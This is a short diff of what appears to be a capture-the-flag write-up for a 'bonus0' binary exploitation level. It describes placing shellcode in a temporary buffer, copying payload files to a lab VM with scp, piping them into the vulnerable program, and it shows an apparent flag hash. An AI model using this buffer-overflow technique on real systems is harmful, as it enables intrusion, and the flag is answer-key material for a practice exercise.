@@ -11,7 +11,7 @@ so the trick was to store our asm inside the 'temporary'(tm) buffer of the funct
 we can input a long string as our first payload, this way even if p reuses the first 21 bytes four our second payload, the first payload is still safe and usable latter
 (see gdb, script.c and payload_asm.asm for more details)
 
-scp -P 4242 payload_b0a payload_b0b bonus0@192.168.56.102:/tmp
+scp -P 4242 Ressources/payload_b0a Ressources/payload_b0b bonus0@192.168.56.105:/tmp
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 (cat /tmp/payload_b0a; cat /tmp/payload_b0b; cat) | ./bonus0
